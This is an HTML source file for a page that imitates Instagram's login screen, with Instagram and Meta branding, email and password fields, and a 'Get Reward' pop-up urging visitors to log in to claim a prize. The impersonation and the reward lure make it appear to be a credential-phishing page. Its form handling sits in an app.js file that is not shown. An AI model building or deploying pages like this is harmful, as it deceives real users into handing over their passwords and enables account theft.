<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>

<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/npm/material-components-web@14.0.0/dist/material-components-web.min.css" rel="stylesheet">
<script src="https://cdn.jsdelivr.net/npm/material-components-web@14.0.0/dist/material-components-web.min.js"></script>
<link rel="stylesheet" href="style.css">
</head>

<body>

<div class="container-fluid main-container">

<div class="row vh-100">

<!-- LEFT SIDE -->

<div class="col-lg-8 left-side">

<div class="logo">
    <img src="instagram.png" width="72" height="72">
</div>

<h2 class="title">
See everyday moments from your <br>
<span>close friends.</span>
</h2>

<img src="dash.webp" class="phones">

</div>


<!-- RIGHT SIDE LOGIN -->

<div class="col-lg-4 right-side d-flex align-items-center justify-content-center">

<div class="login-box">

<div class="logo d-lg-none text-center mb-3">
<img src="instagram.png" width="72" height="72">
</div>
<h6 class="mb-3">Log in to Instagram</h6>

<form id="loginForm">

<input id="email" type="text" class="form-control mb-2" placeholder="Email">
<div id="emailError" class="error"></div>

<input id="password" type="password" class="form-control mb-2" placeholder="Password">
<div id="passwordError" class="error"></div>
<button type="submit" class="btn login-btn w-100 mb-3">Log in</button>
</form>

<p class="text-center small"><a href="#">Forgotten password?</a></p>

<button class="btn facebook-btn w-100 mb-3">
Log in with Facebook
</button>

<button class="btn create-btn w-100">
Create new account
</button>

<p class="meta text-center mt-4">Meta</p>

</div>

</div>

</div>

</div>
<!-- REWARD MODAL -->
<div class="modal fade" id="rewardModal" tabindex="-1">
  <div class="modal-dialog modal-dialog-centered">
    <div class="modal-content text-center">

      <div class="modal-header">
        <h5 class="modal-title w-100">🎁 Get Reward</h5>
      </div>

      <div class="modal-body">
        <p class="mb-3">
          Login to get reward
        </p>

        <button id="loginNowBtn" class="btn btn-primary w-100">
          Login Now
        </button>
      </div>

    </div>
  </div>
</div>
<script type="module" src="app.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
